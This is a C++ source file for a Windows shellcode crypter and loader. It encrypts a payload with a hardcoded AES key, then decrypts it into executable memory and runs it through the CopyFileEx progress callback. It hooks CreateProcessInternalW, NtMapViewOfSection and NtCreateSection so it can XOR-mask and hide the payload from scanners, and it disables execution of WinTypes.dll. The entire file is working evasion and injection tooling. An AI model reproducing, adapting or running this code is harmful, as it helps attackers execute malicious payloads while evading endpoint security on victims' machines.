#define _CRT_SECURE_NO_WARNINGS
#define _MT
#include <Windows.h>

#include <stdio.h>
#include <string.h>
#include <Wincrypt.h>
#include <time.h>
#include <process.h>
#include <tchar.h>
#include <psapi.h>
#include <ntstatus.h>
#include <winternl.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

using namespace std;


const char* extension = ".ramon";
#define AES_KEY_SIZE 16
#define CHUNK_SIZE (AES_KEY_SIZE*5)
void* offset;
size_t size_offset;

typedef struct _SECTION_BASIC_INFORMATION {
	PVOID         Base;
	ULONG         Attributes;
	LARGE_INTEGER Size;
} SECTION_BASIC_INFORMATION, * PSECTION_BASIC_INFORMATION;

// http://undocumented.ntinternals.net/source/usermode/structures/section_image_information.html
typedef struct _SECTION_IMAGE_INFORMATION {
	PVOID                   EntryPoint;
	ULONG                   StackZeroBits;
	ULONG                   StackReserved;
	ULONG                   StackCommit;
	ULONG                   ImageSubsystem;
	WORD                    SubSystemVersionLow;
	WORD                    SubSystemVersionHigh;
	ULONG                   Unknown1;
	ULONG                   ImageCharacteristics;
	ULONG                   ImageMachineType;
	ULONG                   Unknown2[3];
} SECTION_IMAGE_INFORMATION, * PSECTION_IMAGE_INFORMATION;


typedef enum _SECTION_INFORMATION_CLASS {
	SectionBasicInformation,
	SectionImageInformation
} SECTION_INFORMATION_CLASS, * PSECTION_INFORMATION_CLASS;

typedef NTSYSAPI NTSTATUS NTAPI NtQuerySection(



	IN HANDLE               SectionHandle,
	IN SECTION_INFORMATION_CLASS InformationClass,
	OUT PVOID               InformationBuffer,
	IN ULONG                InformationBufferSize,
	OUT PULONG              ResultLength OPTIONAL);


char* encrypter_111(const char* path, BOOL isDecrypt, LPDWORD bytes, BOOL calculate) 
{
	if (strlen(path) > MAX_PATH)
		return 0;
	char filename[266];
	char filename2[260 + 6];
	if (!isDecrypt)
	{

		strcpy_s(filename, 266, path);
		strcpy_s(filename2, 266, path);
		strcat_s(filename2, 266, extension);

	}
	else
	{
		strcpy_s(filename, 266, path);
	}



	wchar_t default_key[] = L"7fwivcli7r#auzS";
	wchar_t* key_str = default_key;

	size_t len = lstrlenW(key_str);


	HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInpFile == INVALID_HANDLE_VALUE) {

		return 0;
	}

	/*HANDLE hOutFile = CreateFileA(filename2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE) {
		printf("Cannot open output file!\n");
		system("pause");
		return 0;
	}*/



	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;

	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		dwStatus = GetLastError();
		return 0;
	}



	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		dwStatus = GetLastError();

		return 0;
	}

	if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
		DWORD err = GetLastError();

		return 0;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
		dwStatus = GetLastError();

		return 0;
	}


	const size_t chunk_size = CHUNK_SIZE;
	BYTE chunk[chunk_size] = { 0 };
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInpFile, NULL);
	*bytes = inputSize;
	if (calculate == TRUE)
	{

		CryptReleaseContext(hProv, 0);
		CryptDestroyKey(hKey);
		CryptDestroyHash(hHash);
		//memset(random, '\0', 16);
		CloseHandle(hInpFile);
		/*if (!isDecrypt)
			CloseHandle(hOutFile);*/
		return 0;
	}

	char* kaka = (char*)malloc(inputSize + 1);
	if (!kaka)
		return 0;
	int i = 0;
	while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize == inputSize) {
			isFinal = TRUE;
		}

		if (isDecrypt) {
			if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
				break;
			}
		}
		else {
			if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
				break;
			}
		}
		DWORD written = 0;

		if (i != 0)
			memcpy(kaka + 80 * i, chunk, out_len);
		else
		{
			memcpy(kaka, chunk, out_len);

		}
		i++;

		/*if (!isDecrypt)
		{
			if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
				printf("writing failed!\n");
				break;
			}
		}*/
		memset(chunk, 0, chunk_size);
	}
	*bytes = inputSize;
	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);
	//memset(random, '\0', 16);
	CloseHandle(hInpFile);
	/*if (!isDecrypt)
		CloseHandle(hOutFile);
	if (isDecrypt == FALSE)
	{
		HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		CloseHandle(hInpFile);
	}*/


	return kaka;





}







char* crypter(const char* path, BOOL isDecrypt, LPDWORD bytes, BOOL calculate)
{
	if (strlen(path) > MAX_PATH)
		return 0;
	char filename[266];
	char filename2[260 + 6];
	if (!isDecrypt)
	{

		strcpy_s(filename, 266, path);
		strcpy_s(filename2, 266, path);
		strcat_s(filename2, 266, extension);

	}
	else
	{
		strcpy_s(filename, 266, path);
	}



	wchar_t default_key[] = L"7fwivcli7r#auzS";
	wchar_t* key_str = default_key;

	size_t len = lstrlenW(key_str);
	FILE* fp = fopen(path, "rb");
	if (!fp)
	{
		printf("Error\n");
		return 0;
	}
	fseek(fp, 0L, SEEK_END);
	size_t sz = ftell(fp);
	rewind(fp);
	char* buf = (char*)malloc(sz);
	int charsTransferred = fread(buf, 1, sz, fp);
	fclose(fp);
	fp = fopen(path, "wb+");
	const char* aux = "\x41\x41\x41\x41\x90\x90\x90\x90";
	fwrite(aux, 8, 1, fp);
	fwrite(buf, 1, sz, fp);
	fclose(fp);
	free(buf);

	HANDLE hInpFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);

	if (hInpFile == INVALID_HANDLE_VALUE) {

		return 0;
	}


	HANDLE hOutFile = CreateFileA(filename2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE) {

		return 0;
	}



	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;

	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		dwStatus = GetLastError();

		return 0;
	}



	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		dwStatus = GetLastError();

		return 0;
	}

	if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
		DWORD err = GetLastError();

		return 0;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
		dwStatus = GetLastError();

		return 0;
	}


	const size_t chunk_size = CHUNK_SIZE;
	BYTE chunk[chunk_size] = { 0 };
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInpFile, NULL);
	*bytes = inputSize;
	if (calculate == TRUE)
	{

		CryptReleaseContext(hProv, 0);
		CryptDestroyKey(hKey);
		CryptDestroyHash(hHash);
		CloseHandle(hInpFile);
		if (!isDecrypt)
			CloseHandle(hOutFile);
		return 0;
	}

	char* kaka = (char*)malloc(inputSize + 1);
	if (!kaka)
		return 0;
	int i = 0;
	while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize == inputSize) {
			isFinal = TRUE;
		}

		if (isDecrypt) {
			if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
				break;
			}
		}
		else {
			if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
				break;
			}
		}
		DWORD written = 0;


		if (!isDecrypt)
		{
			if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
				break;
			}
		}
		memset(chunk, 0, chunk_size);
	}
	*bytes = inputSize;
	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);
	CloseHandle(hInpFile);
	if (!isDecrypt)
		CloseHandle(hOutFile);


	return kaka;





}






typedef
BOOL(WINAPI* PCreateProcessInternalW)(
	HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken
	);


typedef NTSTATUS(NTAPI* myNtMapViewOfSection)  
	(HANDLE SectionHandle, 
	HANDLE ProcessHandle, 
	PVOID* BaseAddress, 
	ULONG_PTR ZeroBits, 
	SIZE_T CommitSize, 
	PLARGE_INTEGER SectionOffset, 
	PSIZE_T ViewSize, 
	DWORD InheritDisposition, 
	ULONG AllocationType,
	ULONG Win32Protect);










char tramp[13] = {
	0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
	0x41, 0xFF, 0xE2                                                    // jmp r10
};
char tramp_old[13];

char tramp2[13] = {
	0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
	0x41, 0xFF, 0xE2                                                    // jmp r10
};
char tramp2_old[13];


char tramp_ntcreatesection[13] = {
	0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
	0x41, 0xFF, 0xE2                                                    // jmp r10
};
char tramp_old_ntcreatesection[13];


BOOL restore_function(HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken)
{
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	PCreateProcessInternalW CreateProcessInternalW;
	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("kernelbase.dll"), "CreateProcessInternalW");

	DWORD written2,wt3;

	VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
	VirtualProtect(tramp_old, sizeof tramp_old, PAGE_EXECUTE_READWRITE, &wt3);

	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
	if (!WriteProcessMemory(hProc, CreateProcessInternalW, &tramp_old, sizeof tramp_old, NULL))
	{

		return FALSE;
	}
	CreateProcessInternalW(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation,
		hNewToken);
	return FALSE;
	
		


	return TRUE;
}


BOOL restore_ntmap(HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect)
{
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	myNtMapViewOfSection NtMap;
	NtMap = (myNtMapViewOfSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtMapViewOfSection");
	DWORD written2, written3;


	VirtualProtect(NtMap, sizeof NtMap, PAGE_EXECUTE_READWRITE, &written2);
	VirtualProtect(tramp2_old, sizeof tramp2_old, PAGE_EXECUTE_READWRITE, &written3);

	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
	if (!WriteProcessMemory(hProc, NtMap, &tramp2_old, sizeof tramp2_old, NULL))
	{
		return FALSE;
	}
	NtMap(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
	return 1;

}


BOOL restore_createprocess_hooks(
	HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken)
{
	restore_function(hToken,
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation,
		hNewToken);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	PCreateProcessInternalW CreateProcessInternalW;
	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
	DWORD written2;

	VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
	DWORD old2;
	VirtualProtect(tramp, sizeof tramp, PAGE_EXECUTE_READWRITE, &old2);
	if (!WriteProcessMemory(hProc, (LPVOID*)CreateProcessInternalW, &tramp, sizeof tramp, NULL))
	{
		return FALSE;
	}
	return TRUE;
}

BOOL WINAPI hook_CreateProcessA(
	HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken
)
{
	HANDLE hHeaps[250];
	const char* mask = "MZE";
	const char* key = "ASDFASF234124jklsf-4&%/&/";
	size_t key_size = sizeof key;
	__int64 ii = (__int64)offset;
	int keyIndex = 0;
	for (__int64 ij = (__int64)offset; (__int64)ij < (_int64)offset + size_offset; ij += 0x01)
	{
		*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
		keyIndex += 1;
	}

	DWORD old;
	VirtualProtect(offset, size_offset, PAGE_NOACCESS, &old);

	if (restore_createprocess_hooks(hToken,
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation,
		hNewToken) == FALSE)
	{
		return 0;
	}
	Sleep(5000);

	VirtualProtect(offset, size_offset, old, &old);

	keyIndex = 0;
	for (__int64 ij = (__int64)offset; (__int64)ij < (_int64)offset + size_offset; ij += 0x01)
	{
		*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
		keyIndex += 1;

	}

	
}


using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);


NTSTATUS ntCreateMySection (OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
BOOL restore_hook_ntcreatesection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);

NTSTATUS ntCreateMySection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL)
{
	int isFinal = 0;
	char lpFilename[256];
	if (FileHandle != NULL)
	{

		DWORD res = GetFinalPathNameByHandleA(FileHandle, lpFilename, 256, FILE_NAME_OPENED | VOLUME_NAME_DOS);
		if (res == 0)
			printf("GetFinalPathNameByHandleA error: %d\n", GetLastError());
		
		else
		{
			if (strstr(lpFilename, "WinTypes.dll") != 0)
			{
				isFinal = 1;
				SectionAttributes = SEC_IMAGE_NO_EXECUTE;

			}
		}
	}
	restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle);
	return 1;
}


BOOL hook_ntcreatesection(HANDLE hProc);
BOOL restore_hook_ntcreatesection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL)
{
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	myNtCreateSection NtCreate;
	NtCreate = (myNtCreateSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtCreateSection");
	DWORD written2, written3;


	VirtualProtect(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written2);
	VirtualProtect(tramp_old_ntcreatesection, sizeof tramp_old_ntcreatesection, PAGE_EXECUTE_READWRITE, &written3);

	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
	if (!WriteProcessMemory(hProc, NtCreate, &tramp_old_ntcreatesection, sizeof tramp_old_ntcreatesection, NULL))
	{
		return FALSE;
	}
	NtCreate(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle);
	hook_ntcreatesection(hProc);
	return 1;

}
BOOL hook_ntcreatesection(HANDLE hProc)
{
	myNtCreateSection NtCreate;
	NtCreate = (myNtCreateSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtCreateSection");
	if (!NtCreate)
		exit(-1);
	DWORD written3;


	VirtualProtect(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written3);

	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
	void* shit3 = (void*)ntCreateMySection;


	memcpy(tramp_old_ntcreatesection, NtCreate, sizeof tramp_old_ntcreatesection);
	memcpy(&tramp_ntcreatesection[2], &shit3, sizeof shit3);

	DWORD old3;

	VirtualProtect(tramp2, sizeof tramp_ntcreatesection, PAGE_EXECUTE_READWRITE, &old3);


	if (!WriteProcessMemory(hProc, (LPVOID*)NtCreate, &tramp_ntcreatesection, sizeof tramp_ntcreatesection, NULL))
	{
		return -1;
	}
	return 1;
}


__int64 aux, lpdata, cbdata;
int iteration=0;
BOOL hook_ntmap(HANDLE hProc);
NTSTATUS null_function(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
BOOL hook_ntmap(HANDLE hProc)
{
	myNtMapViewOfSection NtMap;
	NtMap = (myNtMapViewOfSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtMapViewOfSection");
	if (!NtMap)
		exit(-1);
	DWORD written3;


	VirtualProtect(NtMap, sizeof NtMap, PAGE_EXECUTE_READWRITE, &written3);

	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
	void* shit2 = (void*)null_function;


	memcpy(tramp2_old, NtMap, sizeof tramp2_old);
	memcpy(&tramp2[2], &shit2, sizeof shit2);

	DWORD old3;

	VirtualProtect(tramp2, sizeof tramp2, PAGE_EXECUTE_READWRITE, &old3);


	if (!WriteProcessMemory(hProc, (LPVOID*)NtMap, &tramp2, sizeof tramp2, NULL))
	{
		return -1;
	}
	return 1;
}



BOOL restore_hook_image_notification(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect)
{
	restore_ntmap(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	hook_ntmap(hProc);
	return TRUE;

}

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct __PUBLIC_OBJECT_TYPE_INFORMATION2 {
	UNICODE_STRING TypeName;
	ULONG Reserved[50];    // reserved for internal use
} PUBLIC_OBJECT_TYPE_INFORMATION2, * PPUBLIC_OBJECT_TYPE_INFORMATION2;


NTSTATUS null_function(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect)
{
	FILE* fp = fopen("holyshit", "rb");
	if (fp)
		DeleteFile("holyshit");
	HANDLE hHeaps[250];
	const char* mask = "MZE";
	const char* key = "ASDFASF234124jklsf-4&%/&/";
	size_t key_size = sizeof key;
	//printf("Doing good\n");
	__int64 ii = (__int64)offset;
	int keyIndex = 0;
	for (__int64 ij = (__int64)offset; (__int64)ij < (_int64)offset + size_offset; ij += 0x01)
	{
		*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
		keyIndex += 1;
	}
	//printf("Key index: %d\n", keyIndex);
	//printf("Successfully encrypted XOR\n");
	DWORD old;
	//VirtualProtect(offset, size_offset, PAGE_NOACCESS, &old);

	NtQuerySection* ntsection = (NtQuerySection*)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySection");
	SECTION_BASIC_INFORMATION sbi;
	HANDLE hProcessCurrent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	HANDLE dupHandle;
	int ress = DuplicateHandle(hProcessCurrent, SectionHandle, hProcessCurrent, &dupHandle, 0x0001, NULL, FALSE);
	if (ress == 0) {
		if (GetLastError() == ERROR_NOT_SUPPORTED) {
			// it is most likely an ETWRegistration
			printf("Error not supported\n");
		}

		if (GetLastError() == ERROR_ACCESS_DENIED) {
			printf("Error access denied\n");
		}

		//wprintf(L"Error on DuplicateHandle for %#010x \n", SourceHandle);
		//std::wcout << GetLastErrorStdStr();

	}
	PUBLIC_OBJECT_TYPE_INFORMATION2 oti;
	ULONG retLen;
	int queryObjectRet = NtQueryObject(dupHandle, ObjectTypeInformation, &oti, sizeof(oti), &retLen);

	wchar_t* typeName = oti.TypeName.Buffer;
	if (hProcessCurrent)
	{


		NTSTATUS stat = ntsection((HANDLE)dupHandle, SectionBasicInformation, &sbi, sizeof sbi, 0);
		if (!NT_SUCCESS(stat)) {
			//printf("Error on NtQuerySection\n");
			printf("Error: %lu\n", GetLastError());
		}
		if (sbi.Attributes==16777216)
			printf("Image no execution mapped\n");

		

	}
	DWORD old_noaccess;
	BOOL restore = restore_hook_image_notification(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
	VirtualProtect(offset, 1024, PAGE_NOACCESS, &old_noaccess);

	Sleep(500);
	DWORD oldold;
	VirtualProtect(offset, 1024, old_noaccess, &oldold);
	CloseHandle(hProcessCurrent);
	//Sleep(500);
	if (restore == FALSE)
	{
		return 0;
	}
	
	keyIndex = 0;
	for (__int64 ij = (__int64)offset; (__int64)ij < (_int64)offset + size_offset; ij += 0x01)
	{
		*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
		keyIndex += 1;

	}

		
	return 1;
	
}


BOOL hook_createprocess(HANDLE hProc)
{
	DWORD written2;
	PCreateProcessInternalW CreateProcessInternalW;
	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
	if (!CreateProcessInternalW)
		exit(-1);
	VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
	
	puts("\n");
	void* shit = (void*)hook_CreateProcessA;
	memcpy(tramp_old, CreateProcessInternalW, sizeof tramp_old);
	memcpy(&tramp[2], &shit, sizeof(shit));
	DWORD old2;
	VirtualProtect(tramp, sizeof tramp, PAGE_EXECUTE_READWRITE, &old2);
	if (!WriteProcessMemory(hProc, (LPVOID*)CreateProcessInternalW, &tramp, sizeof tramp, NULL))
	{
		return -1;
	}
	return 1;
}




int main(int argc, char **argv) 
{
	
	if (argc < 2)
	{
		printf("Argc: %d\n", argc);
		printf("\nUsage: ./%s <injector / crypter> <file_to_inject / file_to_encrypt>\n", argv[0]);
		return 0;
	}
	
	if (strcmp(argv[1], "crypter") == 0)
	{
		if (argc != 3)
		{
			printf("\nUsage: ./%s <crypter> <file_to_encrypt>\n", argv[0]);
			return 0;
		}
		static DWORD size = NULL;
		crypter(argv[2], false, &size, false);
		printf("Creating file: %s.ramon\n", argv[2]);
		return 1;
	}
	if (strcmp(argv[1], "injector") == 0)
	{
		if (argc != 3)
		{
			printf("\nUsage: ./%s <injector> <file_to_inject>\n", argv[0]);
			return 0;
		}
		static DWORD size = NULL;

		encrypter_111(argv[2], true, &size, true);
		char* lloc = (char*)malloc(size);
		memcpy(lloc, encrypter_111(argv[2], true, &size, false), size);
		offset = (void*)lloc;
		size_offset = size;
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
		hook_createprocess(hProc);
		hook_ntmap(hProc);
		hook_ntcreatesection(hProc);
		DWORD dold = NULL;
		if (!VirtualProtect(lloc, size, PAGE_EXECUTE_READWRITE, &dold))
			return 0;
		if (!CopyFileEx(argv[2], "deletefile", (LPPROGRESS_ROUTINE)lloc, NULL, FALSE, 0))
			printf("Error: %d\n", GetLastError());
		free(lloc);
	}


}